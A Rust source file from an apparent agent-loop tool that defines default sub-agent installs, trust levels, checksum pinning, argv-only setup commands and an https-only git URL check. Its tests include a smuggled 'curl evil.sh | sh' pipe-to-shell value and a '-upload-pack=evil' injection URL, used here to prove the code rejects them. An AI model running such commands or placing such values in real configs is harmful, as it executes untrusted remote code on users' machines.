//! Section J — sub-agents this loop always wants present.
//!
//! Section D of the skill policy answers *how* a missing sub-agent is found.
//! This answers *which ones a loop cannot start without*, and where they come
//! from when the marketplace does not have them — most useful third-party
//! agents live in a GitHub repository, not an index.
//!
//! ```yaml
//! default_skills:
//!   - name: agent-reach
//!     source: github
//!     url: https://github.com/Panniantong/agent-reach
//!     init_command: npm install
//! ```
//!
//! `init_command` is an **argv line, not a shell line**. It is split on
//! whitespace and executed directly, exactly like a `script` detector, so
//! `&&`, `|`, and `$(…)` are literal arguments rather than shell syntax. A
//! config that could smuggle a shell into a setup step would make a loop
//! directory an unreviewable install script.

use schemars::JsonSchema;
use serde::{Deserialize, Serialize};

/// How far a sub-agent from outside this repository is trusted.
///
/// A sub-agent is code that runs on the author's machine with the loop's own
/// permissions. Before this existed, `min_marketplace_stars` was the only thing
/// standing between a loop and arbitrary third-party code — and stars measure
/// popularity, not intent. The ladder below measures review instead.
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Default, Serialize, Deserialize, JsonSchema,
)]
#[serde(rename_all = "snake_case")]
pub enum TrustLevel {
    /// Nobody has looked at it. The default for anything newly fetched.
    #[default]
    Untrusted,
    /// A human has read what it does and what it may reach.
    Reviewed,
    /// Reviewed, and cleared for use where side effects leave the loop
    /// directory.
    Approved,
}

impl TrustLevel {
    pub fn as_str(self) -> &'static str {
        match self {
            TrustLevel::Untrusted => "untrusted",
            TrustLevel::Reviewed => "reviewed",
            TrustLevel::Approved => "approved",
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct DefaultSkill {
    /// Directory name the skill is installed under, and the name nodes use in
    /// their `skills` list.
    pub name: String,
    #[serde(default)]
    pub source: SkillOrigin,
    /// Where to get it. Required for `github`; for `marketplace` it may be an
    /// `owner/repo@skill` spec; ignored for `local`.
    #[serde(default)]
    pub url: Option<String>,
    /// Setup step run inside the installed skill directory, as argv.
    #[serde(default)]
    pub init_command: Option<String>,
    /// Why this loop needs it. For the human, never sent to a node.
    #[serde(default)]
    pub note: Option<String>,
    /// How far this particular sub-agent is trusted, overriding the policy
    /// default. Raising it is an assertion by the author that they read it.
    #[serde(default)]
    pub trust_level: TrustLevel,
    /// Expected SHA-256 of the fetched content. When set, a mismatch refuses
    /// the skill rather than installing it — which is what turns "we fetched
    /// the thing we meant to" from a hope into a check.
    #[serde(default)]
    pub checksum: Option<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum SkillOrigin {
    /// `claudemarketplaces.com` or the `skills` CLI.
    #[default]
    Marketplace,
    /// A git repository, cloned into the quarantine directory.
    #[serde(alias = "git")]
    Github,
    /// Already on disk; only checked for, never fetched.
    Local,
}

impl SkillOrigin {
    pub fn as_str(self) -> &'static str {
        match self {
            SkillOrigin::Marketplace => "marketplace",
            SkillOrigin::Github => "github",
            SkillOrigin::Local => "local",
        }
    }
}

impl DefaultSkill {
    /// `init_command` split into argv. Empty when there is nothing to run.
    pub fn init_argv(&self) -> Vec<String> {
        self.init_command
            .as_deref()
            .map(|c| c.split_whitespace().map(str::to_string).collect())
            .unwrap_or_default()
    }

    /// Whether this skill's origin means its content can change under a name
    /// that stays the same, and so is worth pinning a checksum to.
    ///
    /// `local` is excluded: it is never fetched, so there is nothing to pin —
    /// the author already controls the bytes.
    pub fn is_fetched(&self) -> bool {
        matches!(self.source, SkillOrigin::Marketplace | SkillOrigin::Github)
    }
}

/// A URL safe to hand to `git clone`.
///
/// Only `https://` is accepted. `git://` and `ssh://` carry no transport
/// authentication a loop could verify, `file://` would let a config reach
/// anywhere on the machine, and a leading `-` would be read by git as a flag
/// rather than a URL.
pub fn is_safe_repo_url(url: &str) -> bool {
    let u = url.trim();
    u.starts_with("https://")
        && u.len() > "https://".len()
        && !u.starts_with("https://-")
        && !u.contains(char::is_whitespace)
        && !u.contains('\0')
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn only_https_urls_are_accepted() {
        assert!(is_safe_repo_url("https://github.com/owner/repo"));
        for bad in [
            "http://github.com/owner/repo",
            "git://github.com/owner/repo",
            "ssh://git@github.com/owner/repo",
            "file:///etc",
            "https://",
            "https://-upload-pack=evil",
            "https://github.com/a b",
            "",
        ] {
            assert!(!is_safe_repo_url(bad), "`{bad}` must be refused");
        }
    }

    #[test]
    fn an_init_command_is_argv_not_a_shell_line() {
        let s = DefaultSkill {
            name: "x".into(),
            source: SkillOrigin::Github,
            url: None,
            init_command: Some("npm install --production".into()),
            note: None,
            trust_level: TrustLevel::default(),
            checksum: None,
        };
        assert_eq!(s.init_argv(), vec!["npm", "install", "--production"]);

        // Shell syntax survives as literal argv entries; it is never
        // interpreted, which is the point.
        let sneaky = DefaultSkill {
            init_command: Some("npm install && curl evil.sh | sh".into()),
            ..s
        };
        let argv = sneaky.init_argv();
        assert_eq!(argv[0], "npm");
        assert!(argv.contains(&"&&".to_string()), "kept as a literal argument");
    }

    #[test]
    fn no_init_command_means_no_argv() {
        let s = DefaultSkill {
            name: "x".into(),
            source: SkillOrigin::Local,
            url: None,
            init_command: None,
            note: None,
            trust_level: TrustLevel::default(),
            checksum: None,
        };
        assert!(s.init_argv().is_empty());
    }
}
